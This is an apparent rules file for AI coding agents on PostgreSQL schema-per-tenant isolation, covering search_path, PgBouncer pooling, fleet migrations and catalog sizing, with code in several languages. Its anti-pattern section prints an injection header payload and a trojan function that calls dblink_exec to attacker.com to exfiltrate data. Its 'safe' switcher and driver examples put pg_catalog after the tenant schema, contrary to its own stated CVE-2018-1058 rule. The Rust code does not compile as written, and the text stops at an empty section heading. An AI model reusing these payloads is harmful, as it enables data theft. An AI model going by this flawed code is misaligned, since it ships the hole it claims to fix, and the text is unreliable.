---
description: PostgreSQL multi-tenant schema-per-tenant architecture, search_path injection defense, CVE-2018-1058 search_path hijacking prevention, PgBouncer transaction pooling session bleed elimination, backend relcache memory bloat sizing, fleet DDL migration chunking under lock_timeout, and autovacuum catalog starvation defense across Go (jackc/pgx/v5), TypeScript (pg, drizzle, prisma, kysely), Python (asyncpg), Rust (sqlx), and autonomous coding agents (Claude Code, Cursor Composer, Windsurf Cascade, Devin, Roo Code, Pi).
globs: **/*{tenant,multitenant,multi_tenant,schema,search_path,migration,fleet,isolation,relcache}*.*,**/src/db/**/*.{ts,js,go,rs,py},**/src/tenant/**/*.{ts,js,go,rs,py},**/internal/database/**/*.{go,rs},**/migrations/**/*.{sql,ts,go,py},**/config/**/*.{ini,conf,toml,yaml,json}
alwaysApply: false
---

# Agentic Database Schema-per-Tenant Multi-Tenancy, search_path Fencing, Relcache Bloat Defense, PgBouncer Session Bleed & Fleet DDL Migration Invariants

> Add these rules to your project when utilizing autonomous coding agents (Claude Code, Cursor Composer, Windsurf Cascade, Devin, Roo Code, Pi, OpenCode, SWE-bench) to design, implement, automate, or audit PostgreSQL schema-per-tenant multi-tenancy (`CREATE SCHEMA tenant_xxx`), runtime schema switching (`SET search_path`), connection pooler tenant isolation (PgBouncer in transaction pooling mode), fleet DDL migrations across thousands of schemas, or catalog/relcache capacity planning across Go (`jackc/pgx/v5`), TypeScript (`pg`, `drizzle-orm`, `prisma`, `kysely`), Python (`asyncpg`, `psycopg`), or Rust (`sqlx`, `tokio-postgres`). Eliminate the "PgBouncer Transaction Pooling Session Bleed & Cross-Tenant Data Breach" (where agents execute session-level `SET search_path` in pooled connections, leaving the schema active on the server connection so subsequent requests from Tenant B read and mutate Tenant A's private data, $P(\text{cross-tenant leak}) = 1.0$), the "search_path Dynamic String Interpolation & SQL Injection Catastrophe" (where agents concatenate unescaped tenant identifiers into `SET search_path = '...'`, allowing unauthenticated SQL injection and remote takeover), the "CVE-2018-1058 search_path Hijacking & Trojan Function Escalation Hole" (where omitting explicit `pg_catalog` in search_path allows malicious tenant schemas to define shadow functions like `lower()` or `uuid_generate_v4()` that hijack superuser maintenance queries), the "10,000-Schema Relcache Memory Bloat & Linux OOM Killer Decapitation" (where thousands of schemas balloon backend relation cache memory past gigabytes per process, exhausting system RAM and triggering SIGKILL crashes), the "Monolithic Fleet DDL Migration Avalanche & AccessExclusiveLock Serialization Freeze" (where running schema migrations across thousands of tenants in a single loop blocks application queries cluster-wide, causing connection pool exhaustion), and the "Autovacuum Catalog Starvation & Transaction ID Wraparound Threat" (where autovacuum workers spend 100% of their time scanning hundreds of thousands of dormant catalog entries while active tables approach the 2-billion transaction horizon) by establishing a strict 5-Tier Schema-per-Tenant Governance Ladder, relcache RAM scaling models, PgBouncer cross-tenant leak probability calculus, an autonomous TypeScript `AgenticDatabaseSchemaTenantGuardEngine`, cross-runtime driver invariants in Go, TypeScript, Python, and Rust, a 6-state schema tenancy lifecycle finite-state machine (FSM), and machine-verifiable Definition of Done (DoD) CI gates.

---

## 1. Architectural Taxonomy: The 6 Schema-per-Tenant Catastrophes vs The 5-Tier Schema-per-Tenant Governance Ladder

Schema-per-tenant multi-tenancy is widely favored by enterprise SaaS architects for its balance between logical data separation, ease of per-tenant data exports (`pg_dump -n tenant_xxx`), and shared compute infrastructure. However, autonomous coding agents routinely misunderstand the distinction between session-level and transaction-level GUC parameters, the lack of parameterized queries on `SET search_path`, the internal mechanics of PostgreSQL backend `relcache` memory, and the explosive impact of thousands of schemas on the system catalog. This produces 6 fatal security vulnerabilities and production outages:

### The 6 Schema-per-Tenant Catastrophes

```sql
-- ❌ CATASTROPHIC LLM ANTI-PATTERN 1: THE PGBOUNCER TRANSACTION POOLING SESSION BLEED (CROSS-TENANT BREACH)
-- Agent configures microservice connecting through PgBouncer in transaction pooling mode:
-- When handling an HTTP request for Tenant A:
SET search_path = tenant_alpha, public;
SELECT * FROM orders WHERE customer_id = 'c123';
-- Transaction ends. Server connection is returned to the PgBouncer pool.
--
-- 💥 Catastrophe:
-- 1. PgBouncer pool_mode = transaction DOES NOT reset session GUCs between transactions by default!
-- 2. Physical server connection backend retains search_path = "tenant_alpha, public".
-- 3. Next request arrives from an entirely unrelated customer: Tenant B ("tenant_beta").
-- 4. Microservice forgets to set search_path or executes a query before setting it:
SELECT * FROM orders;
-- 5. PostgreSQL executes the query against tenant_alpha.orders! Tenant B sees Tenant A's private orders!
-- 6. When Tenant B issues UPDATE orders SET status = 'cancelled', it deletes Tenant A's revenue records!
-- Statutory GDPR Article 33 breach, HIPAA violation, catastrophic data contamination (P(cross-tenant leak) = 1.0).
-- Invariant: NEVER use session-level SET search_path. Mandatory SET LOCAL search_path within explicit transactions!
```

```sql
-- ❌ CATASTROPHIC LLM ANTI-PATTERN 2: search_path STRING INTERPOLATION & SQL INJECTION
-- Agent discovers that PostgreSQL prepared statements do NOT accept parameters on SET:
-- "ERROR: syntax error at or near $1 (SQLSTATE 42601)"
-- So the agent generates string interpolation in application code:
-- const query = `SET search_path = ${req.headers['x-tenant-id']}, public`;
-- await client.query(query);

-- 💥 Catastrophe:
-- 1. Attacker sends HTTP header:
--    x-tenant-id: public; DROP TABLE users; --
-- 2. Database executes:
--    SET search_path = public; DROP TABLE users; --, public;
-- 3. The entire public schema is destroyed!
-- Or attacker injects:
--    x-tenant-id: "tenant_evil\"; CREATE FUNCTION pg_catalog.lower(text) RETURNS text ...; --"
-- achieving full remote superuser privilege escalation.
-- Invariant: Mandatory strict regex validation ^[a-z0-9_]{1,63}$ AND quote_ident() before ANY search_path mutation.
```

```sql
-- ❌ CATASTROPHIC LLM ANTI-PATTERN 3: CVE-2018-1058 search_path HIJACKING & TROJAN FUNCTIONS
-- Agent sets search path omitting pg_catalog or placing tenant schemas before pg_catalog:
SET LOCAL search_path = tenant_victim, public;

-- 💥 Catastrophe:
-- 1. PostgreSQL resolves unqualified function and operator calls by traversing search_path in order.
-- 2. If a tenant user (or malicious insider with schema write access) executes:
CREATE FUNCTION tenant_victim.lower(text) RETURNS text AS $$
BEGIN
    -- Exfiltrate superuser password or execute malicious payload
    PERFORM dblink_exec('host=attacker.com user=x password=y', 'INSERT INTO loot ...');
    RETURN pg_catalog.lower($1);
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
-- 3. When an administrator, maintenance script, or background autovacuum queries:
SELECT lower(username) FROM users;
-- 4. PostgreSQL executes tenant_victim.lower() with superuser privileges! CVE-2018-1058 exploit.
-- Invariant: search_path MUST explicitly declare "pg_catalog" before untrusted schemas or qualify functions.
```

```sql
-- ❌ CATASTROPHIC LLM ANTI-PATTERN 4: THE 10,000-SCHEMA RELCACHE MEMORY BLOAT & POSTMASTER OOM KILL
-- SaaS business grows to 5,000 tenants. Each tenant schema has 40 tables and 60 indexes.
-- Total relations in catalog: 5,000 * 100 = 500,000 relations.
-- Agent writes a multi-tenant reporting service or batch processor that connects to the database
-- and iterates over all tenant schemas:
-- FOR tenant IN SELECT schema_name FROM tenants LOOP ...

-- 💥 Catastrophe:
-- 1. PostgreSQL backend processes load relation descriptors into private backend memory (relcache).
-- 2. Each cached relation descriptor occupies ~2KB to 4KB of process heap memory.
-- 3. A single backend touching all tenants allocates: 500,000 * 3 KB = 1.5 GB of RAM.
-- 4. When 50 concurrent connection pool workers execute reporting or background jobs:
--    Total RAM consumed by relcache alone: 50 * 1.5 GB = 75 GB!
-- 5. Database server shared_buffers is crowded out; OS page cache is destroyed.
-- 6. Linux kernel Out-Of-Memory (OOM) killer fires, sends SIGKILL 137 to postmaster,
--    crashing the primary database and initiating catastrophic crash recovery.
-- Invariant: Cap schemas per database cluster at <= 1,000. For > 1,000 tenants, mandatory RLS or Silo (DB-per-tenant).
```

```sql
-- ❌ CATASTROPHIC LLM ANTI-PATTERN 5: MONOLITHIC FLEET DDL MIGRATION AVALANCHE & LOCKOUT
-- Agent creates a migration script to add a column across all 3,000 tenant schemas:
DO $$
DECLARE
    s text;
BEGIN
    FOR s IN SELECT nspname FROM pg_namespace WHERE nspname LIKE 'tenant_%' LOOP
        EXECUTE format('ALTER TABLE %I.orders ADD COLUMN priority int DEFAULT 0;', s);
    END LOOP;
END;
$$;

-- 💥 Catastrophe:
-- 1. This PL/pgSQL block runs in a SINGLE MONOLITHIC TRANSACTION!
-- 2. ALTER TABLE requests an ACCESS EXCLUSIVE lock on each table.
-- 3. At schema #427, an active customer query is running on tenant_427.orders.
-- 4. The migration script waits for the lock. Because it runs in one transaction, it HOLDS AccessExclusiveLock
--    on the 426 preceding tenant schemas while WAITING on schema 427!
-- 5. All incoming queries for tenants 1 through 427 are now BLOCKED in PostgreSQL's lock queue!
-- 6. Connection pool fills to capacity in 3 seconds. The entire application cluster suffers a hard outage.
-- 7. If schema #2,950 fails with a syntax error, the entire 4-hour migration ROLLS BACK completely!
-- Invariant: Mandatory bounded, discrete per-tenant migration transactions with lock_timeout <= 2000ms.
```

```sql
-- ❌ CATASTROPHIC LLM ANTI-PATTERN 6: AUTOVACUUM CATALOG STARVATION & XID WRAPAROUND
-- Cluster contains 300,000 tables across 6,000 tenant schemas.
-- Default PostgreSQL autovacuum settings: autovacuum_max_workers = 3.

-- 💥 Catastrophe:
-- 1. Autovacuum has 3 workers to service 300,000 tables.
-- 2. The cost-based scheduling engine must inspect hundreds of thousands of dormant tables.
-- 3. System catalog relations (pg_class, pg_attribute, pg_statistic) suffer massive bloat and churn.
-- 4. High-throughput OLTP tables (e.g. public billing or active tenant tables) do not get vacuumed in time.
-- 5. Dead tuples accumulate; autovacuum freezing cannot keep pace.
-- 6. Transaction ID age approaches 2,000,000,000 (2 billion).
-- 7. PostgreSQL executes Emergency Shutdown to prevent silent data corruption:
--    "FATAL: database is not accepting commands to avoid wraparound data loss in database 'production'"
-- Invariant: Explicit autovacuum_max_workers calibration, catalog aggressive vacuuming, and wraparound monitoring.
```

---

### The 5-Tier Schema-per-Tenant Governance Ladder

To eliminate all 6 catastrophes, autonomous agents must adhere to the 5-Tier Schema-per-Tenant Governance Ladder:

| Tier | Governance Level | Enforced Invariant | Production Implementation |
| :--- | :--- | :--- | :--- |
| **Tier 0** | **Transactional Isolation** | Zero session `SET search_path`; mandatory `SET LOCAL` | Wrap every tenant operation in an explicit `BEGIN ... COMMIT` block and execute `SET LOCAL search_path = quote_ident(tenant), 'public', 'pg_catalog';`. In transaction pooling (PgBouncer), `SET LOCAL` is automatically discarded at `COMMIT`/`ROLLBACK`, mathematically preventing cross-tenant leakage. |
| **Tier 1** | **Identifier Injection & CVE-2018-1058 Defense** | Strict regex validation & search path ordering | Validate all tenant identifiers against `^[a-z0-9_]{1,63}$`. Forbid dashes or uppercase characters. Always use `quote_ident()`. Ensure `pg_catalog` is placed before untrusted schemas or revoke public create privileges (`REVOKE CREATE ON SCHEMA public FROM PUBLIC`). |
| **Tier 2** | **Connection Pooler Hygiene** | PgBouncer transaction-mode verification & pool reset | Configure PgBouncer with `pool_mode = transaction`. For services using pooled connections, verify that connection release hooks or checkout hooks assert default search path (`SHOW search_path`). Reject session-level GUC mutations. |
| **Tier 3** | **Fleet DDL Migration Orchestration** | Discrete per-tenant transactions & `lock_timeout` | Never execute monolithic multi-tenant DDL loops. Migrations MUST run in discrete per-schema transactions using an orchestrator with worker concurrency $W \in [4, 8]$, enforcing `SET LOCAL lock_timeout = '2s'`, exponential backoff jitter on lock failures, and automated canary verification. |
| **Tier 4** | **Catalog & Relcache Capacity Sizing** | Hard limit of 1,000 schemas per database instance | Enforce cluster-level relation ceilings: $\text{Total Relations} \le 100,000$. When tenant count exceeds 1,000, architect mandatory migration to Row-Level Security (RLS) or Database-per-Tenant (Silo). Proactively monitor `pg_backend_memory_contexts` and `max(age(datfrozenxid))`. |

---

## 2. Mathematical Foundations & Security Invariants

### Theorem 1: Relcache Memory Footprint Model & Backend RAM Scaling

In a PostgreSQL cluster with $N_b$ backend worker processes, $N_t$ tenant schemas, and $N_r$ relations per tenant schema (tables + indexes), the total physical RAM consumed by relation caches across all backends is modeled by:

$$M_{\text{relcache}}(N_b, N_t, N_r) = N_b \times \sum_{i=1}^{N_t} \sum_{j=1}^{N_r} \alpha_{i,j} \cdot \left( S_{\text{rel\_desc}} + K_j \cdot S_{\text{attr\_desc}} + S_{\text{idx\_desc}} \right) + N_b \cdot S_{\text{overhead}}$$

Where:
- $S_{\text{rel\_desc}} \approx 1,850\text{ bytes}$ is the base `RelationData` struct.
- $S_{\text{attr\_desc}} \approx 450\text{ bytes}$ is the descriptor size per column (`FormData_pg_attribute`).
- $K_j$ is the number of attributes in relation $j$ ($K_j \approx 15$).
- $S_{\text{idx\_desc}} \approx 1,200\text{ bytes}$ is the index relation descriptor.
- $\alpha_{i,j} \in [0, 1]$ is the activation factor representing the probability that backend process $k$ has accessed relation $(i, j)$ since backend fork.

**The Full-Mesh Access Degeneracy**: When an application connection pool shares connections across all tenants (no tenant-to-backend pinning), over time $\lim_{t \to \infty} \alpha_{i,j} = 1.0$ for all backends.

For $N_t = 3,000$ tenants, $N_r = 80$ relations per tenant ($40$ tables, $40$ indexes), and $N_b = 60$ connection pool backends:

$$M_{\text{per\_backend}} = 3,000 \times 80 \times 3,500\text{ bytes} \approx 840\text{ MB}$$
$$M_{\text{total\_relcache}} = 60 \times 840\text{ MB} \approx 50.4\text{ GB RAM}$$

$$\text{Postmaster OOM Trigger Condition}: \quad M_{\text{total\_relcache}} + M_{\text{shared\_buffers}} + N_b \cdot \text{work\_mem} > \text{RAM}_{\text{available}}$$

**Invariant**: When $N_t \times N_r > 50,000$, schema-per-tenant MUST NOT be deployed on shared connection pools without tenant affinity routing or strict catalog boundaries.

---

### Theorem 2: PgBouncer Cross-Tenant Data Leak Probability under Transaction Pooling

Let $N_b$ be the number of active server backend connections in a PgBouncer `pool_mode = transaction` pool. Suppose an autonomous agent issues a session-level `SET search_path = tenant_A` for Tenant A without `SET LOCAL`.

When the transaction finishes, connection $C_k$ is returned to the pool with dirty state $\sigma(C_k) = \text{tenant\_A}$.

Let Tenant B issue $M$ successive transactions. The probability that at least one of Tenant B's transactions is assigned dirty connection $C_k$ and leaks Tenant A's private data is:

$$P(\text{cross-tenant leak}) = 1 - \left( 1 - \frac{1}{N_b} \right)^M$$

For $N_b = 20$ server connections and $M = 50$ requests from Tenant B:

$$P(\text{cross-tenant leak}) = 1 - \left( \frac{19}{20} \right)^{50} = 1 - 0.0769 = 0.9231 \quad (92.3\%)$$

After $M = 100$ transactions, $P(\text{cross-tenant leak}) \ge 99.4\%$.

**The Zero-Bleed Invariant**:
$$\forall t \in \text{Transactions}: \quad \text{Execute } \mathtt{SET\ LOCAL\ search\_path} \implies \sigma_{\text{post-commit}}(C_k) \equiv \sigma_{\text{default}}(C_k) \implies P(\text{cross-tenant leak}) \equiv 0$$

---

### Theorem 3: Lock Contention & Queuing Probability during Fleet DDL Migrations

Let $\lambda_{\text{query}}$ be the arrival rate of application read/write queries on a given tenant's tables (Poisson process). Let $\tau_{\text{ddl}}$ be the duration required for an `ALTER TABLE` statement to acquire `AccessExclusiveLock`, execute catalog updates, and commit.

The probability of head-of-line blocking contention $P(\text{blocking})$ during the DDL acquisition window is:

$$P(\text{blocking}) = 1 - e^{-\lambda_{\text{query}} \times \tau_{\text{ddl}}}$$

If a monolithic loop runs across $N$ schemas in a single transaction, the lock retention time $\tau_{\text{held}}$ for earlier schemas scales linearly with $N$:

$$\tau_{\text{held}}(k) = (N - k) \times \bar{\tau}_{\text{migration}}$$

For $N = 2,000$ schemas and $\bar{\tau}_{\text{migration}} = 50\text{ms}$, schema #1 holds `AccessExclusiveLock` for:

$$\tau_{\text{held}}(1) = 2,000 \times 0.05\text{s} = 100\text{ seconds}$$

With $\lambda_{\text{query}} = 5\text{ queries/sec}$, the number of blocked application transactions is:

$$Q_{\text{blocked}} = \lambda_{\text{query}} \times \tau_{\text{held}} = 5 \times 100 = 500\text{ transactions waiting in lock queue}$$

This instantly saturates the application connection pool ($C_{\text{pool}} \le 200$), collapsing the entire microservice cluster.

**The Discrete Isolation Invariant**:
$$\forall k \in [1, N]: \quad \text{Transaction}_k = \mathtt{BEGIN;\ SET\ LOCAL\ lock\_timeout='2s';\ ALTER\ TABLE\ ...;\ COMMIT;}$$
$$\tau_{\text{held}}(k) \le 2.0\text{ seconds} \quad \text{and} \quad \text{Blast Radius} \le 1\text{ tenant}$$

---

### Theorem 4: Autovacuum Catalog Inspection Cycle Period & Starvation Bounds

In a cluster with $N_t$ tenant schemas and $N_r$ relations per schema, total relation count is $R = N_t \times N_r$. Autovacuum operates with $W$ workers (`autovacuum_max_workers`). Each relation inspection incurs a minimum catalog read and calculation overhead $\tau_{\text{inspect}} \approx 0.5\text{ms}$.

The minimum cycle time $T_{\text{cycle}}$ to complete a single autovacuum inspection pass across all relations is:

$$T_{\text{cycle}} = \frac{R \cdot \tau_{\text{inspect}}}{W} = \frac{N_t \cdot N_r \cdot \tau_{\text{inspect}}}{W}$$

For $N_t = 5,000$, $N_r = 80$, $R = 400,000$, and $W = 3$ default workers:

$$T_{\text{cycle}} = \frac{400,000 \times 0.0005\text{s}}{3} \approx 66.7\text{ seconds}$$

If 1% of tables require physical vacuuming with mean vacuum duration $\bar{\tau}_{\text{vac}} = 10\text{s}$:

$$T_{\text{actual\_cycle}} = T_{\text{cycle}} + \frac{0.01 \times 400,000 \times 10\text{s}}{3} = 66.7\text{s} + 13,333\text{s} \approx 3.7\text{ hours}$$

**The Starvation Threat**: High-write tables in active schemas produce dead tuples faster than the 3.7-hour cycle, causing dead tuple bloat to exceed 50% and driving transaction ID consumption toward wraparound.

---

### Theorem 5: The Tenancy Architectural Crossover Theorem

The operational and computational efficiency of tenancy architectures can be defined by three cost metrics: Data Isolation Rigor ($I$), Metadata Overhead ($\Omega$), and Operational Complexity ($\Phi$):

$$\text{Efficiency Score } \mathcal{E} = \frac{I}{\Omega(N_t, N_r) + \Phi(N_t)}$$

1. **Schema-per-Tenant**: $\Omega_{\text{schema}} = \mathcal{O}(N_t \cdot N_r)$ (relcache, catalog, autovacuum).
2. **Row-Level Security (RLS)**: $\Omega_{\text{RLS}} = \mathcal{O}(N_r)$ (independent of $N_t$, fixed table count).
3. **Database-per-Tenant (Silo)**: $\Omega_{\text{db}} = \mathcal{O}(N_t \cdot \text{DB\_overhead})$.

$$\text{Crossover Rule}: \quad \begin{cases}
N_t \le 500 \text{ and strict schema isolation required} & \implies \text{Schema-per-Tenant optimal} \\
500 < N_t \le 100,000 & \implies \text{Row-Level Security (RLS) pooled optimal} \\
\text{High-value enterprise with physical air-gap} & \implies \text{Database-per-Tenant (Silo) optimal}
\end{cases}$$

---

## 3. Production Configuration Sentinels & Implementation Standards

### PostgreSQL Engine Hardening (`postgresql.conf`)

```ini
# ==============================================================================
# POSTGRESQL MULTI-TENANT SCHEMA ENGINE HARDENING
# ==============================================================================

# Catalog and Relcache Protection
# Ensure sufficient shared memory for high relation counts
max_locks_per_transaction = 256            # Elevate from default 64 to avoid out-of-shared-memory errors
track_activity_query_size = 4096           # Support large multi-schema DDL diagnostics

# Autovacuum Fleet Calibration
# Scale workers to service catalog tables and prevent wraparound starvation
autovacuum_max_workers = 8                 # Elevate from default 3 to parallelize multi-schema vacuuming
autovacuum_vacuum_cost_limit = 2000        # Increase I/O budget for faster round-robin passes
autovacuum_naptime = 15s                   # Short sleep interval between sweeps
autovacuum_freeze_max_age = 200000000      # 200M default wraparound horizon

# Timeout Ladders for Multi-Tenant Fleet Protection
statement_timeout = 30000                  # 30s ceiling for OLTP tenant queries
lock_timeout = 2000                        # 2s lock wait ceiling to prevent DDL head-of-line blocking
idle_in_transaction_session_timeout = 5000 # 5s ceiling to prevent leaked tenant transactions
```

---

### PgBouncer Configuration for Schema-per-Tenant (`pgbouncer.ini`)

```ini
[databases]
app_production = host=127.0.0.1 port=5432 dbname=app_production pool_size=50

[pgbouncer]
listen_addr = *
listen_port = 6432
auth_type = scram-sha-256
auth_file = /etc/pgbouncer/userlist.txt

# CRITICAL: Transaction pooling mode MUST be paired with SET LOCAL in application code
pool_mode = transaction
max_client_conn = 2000
default_pool_size = 50
reserve_pool_size = 10
reserve_pool_timeout = 5

# Security & State Bleed Defense
# For session pooling, server_reset_query resets state. In transaction pooling,
# server_reset_query is NOT run between transactions. Therefore SET LOCAL is MANDATORY!
server_reset_query = DISCARD ALL
server_check_query = SELECT 1
server_check_delay = 30

# Disable dangerous session features in transaction pooling
ignore_startup_parameters = extra_float_digits, search_path
```

---

### Hardened Tenant Schema Provisioning SQL Script

```sql
-- ==============================================================================
-- HARDENED TENANT SCHEMA PROVISIONING TEMPLATE
-- Enforces CVE-2018-1058 defense, strict ownership, and privilege revocation
-- ==============================================================================

CREATE OR REPLACE PROCEDURE provision_tenant_schema(
    p_tenant_id text,
    p_app_role text DEFAULT 'app_user'
)
LANGUAGE plpgsql
AS $$
DECLARE
    v_schema_name text;
BEGIN
    -- 1. Strict regex validation of tenant identifier
    IF p_tenant_id !~ '^[a-z0-9_]{1,63}$' THEN
        RAISE EXCEPTION 'Invalid tenant identifier: %. Must match ^[a-z0-9_]{1,63}$', p_tenant_id;
    END IF;

    v_schema_name := 'tenant_' || p_tenant_id;

    -- 2. Create dedicated schema owned by application superuser or administrative role
    EXECUTE format('CREATE SCHEMA IF NOT EXISTS %I AUTHORIZATION postgres;', v_schema_name);

    -- 3. Lock down public schema privileges (CVE-2018-1058 defense)
    REVOKE CREATE ON SCHEMA public FROM PUBLIC;

    -- 4. Grant least-privilege DML access to application user role
    EXECUTE format('GRANT USAGE ON SCHEMA %I TO %I;', v_schema_name, p_app_role);
    EXECUTE format('GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA %I TO %I;', v_schema_name, p_app_role);
    EXECUTE format('ALTER DEFAULT PRIVILEGES IN SCHEMA %I GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO %I;', v_schema_name, p_app_role);
    EXECUTE format('GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA %I TO %I;', v_schema_name, p_app_role);
    EXECUTE format('ALTER DEFAULT PRIVILEGES IN SCHEMA %I GRANT USAGE, SELECT ON SEQUENCES TO %I;', v_schema_name, p_app_role);

    RAISE NOTICE 'Successfully provisioned hardened schema: %', v_schema_name;
END;
$$;
```

---

### Safe Transaction-Scoped Tenant Switcher Procedure

```sql
-- ==============================================================================
-- SAFE RUNTIME TENANT CONTEXT SWITCHER
-- Executes inside an active transaction. Automatically rolls back on failure.
-- ==============================================================================

CREATE OR REPLACE FUNCTION set_tenant_context(p_tenant_id text)
RETURNS void
LANGUAGE plpgsql
AS $$
DECLARE
    v_schema text;
BEGIN
    -- Assert valid tenant identifier
    IF p_tenant_id !~ '^[a-z0-9_]{1,63}$' THEN
        RAISE EXCEPTION 'Invalid tenant identifier: %. Security invariant violated.', p_tenant_id;
    END IF;

    v_schema := 'tenant_' || p_tenant_id;

    -- Verify schema existence in pg_namespace
    IF NOT EXISTS (SELECT 1 FROM pg_namespace WHERE nspname = v_schema) THEN
        RAISE EXCEPTION 'Tenant schema % does not exist', v_schema;
    END IF;

    -- CRITICAL INVARIANT: SET LOCAL search_path ensures:
    -- 1. Scope is strictly bounded to CURRENT TRANSACTION
    -- 2. State is automatically discarded upon COMMIT or ROLLBACK in PgBouncer
    -- 3. "pg_catalog" is explicitly placed to defeat CVE-2018-1058
    -- 4. "pg_temp" is explicitly fenced to prevent Trojan temp table shadowing
    EXECUTE format('SET LOCAL search_path = %I, public, pg_catalog, pg_temp;', v_schema);
END;
$$;
```

---

## 4. Cross-Runtime Client Driver Invariants

### 1. Go (`jackc/pgx/v5`) Production Standard

```go
package database

import (
	"context"
	"fmt"
	"regexp"

	"github.com/jackc/pgx/v5"
	"github.com/jackc/pgx/v5/pgxpool"
)

var tenantIDRegex = regexp.MustCompile(`^[a-z0-9_]{1,63}$`)

// TenantTxFunc defines the callback executed within a tenant's schema context.
type TenantTxFunc func(ctx context.Context, tx pgx.Tx) error

// WithTenantTx executes the provided callback within an explicit transaction isolated
// to the specified tenant schema using SET LOCAL search_path.
// This guarantees zero cross-tenant session bleed under PgBouncer transaction pooling.
func WithTenantTx(ctx context.Context, pool *pgxpool.Pool, tenantID string, fn TenantTxFunc) error {
	// Invariant 1: Validate tenant identifier format to prevent SQL injection
	if !tenantIDRegex.MatchString(tenantID) {
		return fmt.Errorf("security violation: invalid tenant identifier %q", tenantID)
	}

	schemaName := "tenant_" + tenantID

	// Invariant 2: Always execute within an explicit transaction block
	tx, err := pool.BeginTx(ctx, pgx.TxOptions{
		IsoLevel:       pgx.ReadCommitted,
		AccessMode:     pgx.ReadWrite,
		DeferrableMode: pgx.NotDeferrable,
	})
	if err != nil {
		return fmt.Errorf("failed to begin tenant transaction: %w", err)
	}
	defer tx.Rollback(ctx) // Safe: no-op if committed

	// Invariant 3: SET LOCAL search_path with explicit pg_catalog to prevent CVE-2018-1058
	// Note: pgx.Identifier handles quoting safely
	ident := pgx.Identifier{schemaName}.Sanitize()
	setPathQuery := fmt.Sprintf("SET LOCAL search_path = %s, public, pg_catalog, pg_temp;", ident)

	if _, err := tx.Exec(ctx, setPathQuery); err != nil {
		return fmt.Errorf("failed to set tenant search_path: %w", err)
	}

	// Invariant 4: Execute domain logic within the isolated tenant transaction
	if err := fn(ctx, tx); err != nil {
		return err
	}

	// Commit transaction: automatically clears SET LOCAL search_path in PostgreSQL & PgBouncer
	if err := tx.Commit(ctx); err != nil {
		return fmt.Errorf("failed to commit tenant transaction: %w", err)
	}

	return nil
}
```

---

### 2. TypeScript (`pg` / `kysely`) Production Standard

```typescript
import { Pool, PoolClient } from 'pg';

const TENANT_ID_REGEX = /^[a-z0-9_]{1,63}$/;

/**
 * Executes a callback within an isolated tenant transaction using SET LOCAL search_path.
 * Guarantees zero cross-tenant session bleed when using PgBouncer transaction pooling.
 */
export async function withTenantTransaction<T>(
  pool: Pool,
  tenantId: string,
  callback: (client: PoolClient) => Promise<T>
): Promise<T> {
  // Invariant 1: Validate tenant identifier format
  if (!TENANT_ID_REGEX.test(tenantId)) {
    throw new Error(`Security Violation: Invalid tenant identifier "${tenantId}"`);
  }

  const client = await pool.connect();
  const schemaName = `tenant_${tenantId}`;

  try {
    // Invariant 2: Explicit transaction boundary
    await client.query('BEGIN');

    // Invariant 3: Set statement and lock timeouts for tenant safety
    await client.query("SET LOCAL lock_timeout = '2s'");
    await client.query("SET LOCAL statement_timeout = '15s'");

    // Invariant 4: Quote identifier and pin pg_catalog to defeat CVE-2018-1058
    // PostgreSQL quote_ident equivalent in JS
    const quotedSchema = `"${schemaName.replace(/"/g, '""')}"`;
    await client.query(
      `SET LOCAL search_path = ${quotedSchema}, public, pg_catalog, pg_temp;`
    );

    // Invariant 5: Execute domain query
    const result = await callback(client);

    // Invariant 6: Commit transaction, automatically purging SET LOCAL state
    await client.query('COMMIT');
    return result;
  } catch (error) {
    await client.query('ROLLBACK');
    throw error;
  } finally {
    // Release client back to pool
    client.release();
  }
}
```

---

### 3. Python (`asyncpg`) Production Standard

```python
import re
from typing import AsyncGenerator, Callable, Any
import asyncpg

TENANT_ID_REGEX = re.compile(r"^[a-z0-9_]{1,63}$")

async def with_tenant_tx(
    pool: asyncpg.Pool,
    tenant_id: str,
    action: Callable[[asyncpg.Connection], Any]
) -> Any:
    """
    Executes an action within an isolated transaction scoped to tenant schema via SET LOCAL search_path.
    Guarantees zero cross-tenant bleed under PgBouncer transaction pooling.
    """
    # Invariant 1: Strict identifier validation
    if not TENANT_ID_REGEX.match(tenant_id):
        raise ValueError(f"Security Violation: Invalid tenant identifier '{tenant_id}'")

    schema_name = f"tenant_{tenant_id}"

    async with pool.acquire() as conn:
        # Invariant 2: Explicit transaction block
        async with conn.transaction():
            # Invariant 3: Apply lock timeout
            await conn.execute("SET LOCAL lock_timeout = '2s';")
            
            # Invariant 4: Escape identifier and enforce search_path pinning
            escaped_schema = '"' + schema_name.replace('"', '""') + '"'
            await conn.execute(
                f"SET LOCAL search_path = {escaped_schema}, public, pg_catalog, pg_temp;"
            )
            
            # Invariant 5: Execute user logic
            return await action(conn)
```

---

### 4. Rust (`sqlx`) Production Standard

```rust
use sqlx::{PgPool, Transaction, Postgres, Error};
use regex::Regex;
use lazy_static::lazy_static;

lazy_static! {
    static ref TENANT_REGEX: Regex = Regex::new(r"^[a-z0-9_]{1,63}$").unwrap();
}

/// Executes a closure inside an isolated PostgreSQL transaction configured with SET LOCAL search_path.
pub async fn with_tenant_transaction<F, T>(
    pool: &PgPool,
    tenant_id: &str,
    f: F,
) -> Result<T, Error>
where
    F: for<'c> FnOnce(&'c mut Transaction<'_, Postgres>) -> std::pin::Pin<Box<dyn std::future::Output<Result<T, Error>> + Send + 'c>>,
{
    // Invariant 1: Strict regex validation
    if !TENANT_REGEX.is_match(tenant_id) {
        return Err(Error::Protocol(format!("Invalid tenant identifier: {}", tenant_id)));
    }

    let schema_name = format!("tenant_{}", tenant_id);
    let escaped_schema = format!("\"{}\"", schema_name.replace('"', "\"\""));

    // Invariant 2: Explicit transaction boundary
    let mut tx = pool.begin().await?;

    // Invariant 3: SET LOCAL search_path with CVE-2018-1058 defense
    let set_path_sql = format!(
        "SET LOCAL search_path = {}, public, pg_catalog, pg_temp;",
        escaped_schema
    );
    sqlx::query(&set_path_sql).execute(&mut *tx).await?;

    // Invariant 4: Execute domain logic
    let result = f(&mut tx).await?;

    // Invariant 5: Commit transaction
    tx.commit().await?;

    Ok(result)
}
```

---

## 5. Executable TypeScript Guard Engine: `AgenticDatabaseSchemaTenantGuardEngine`

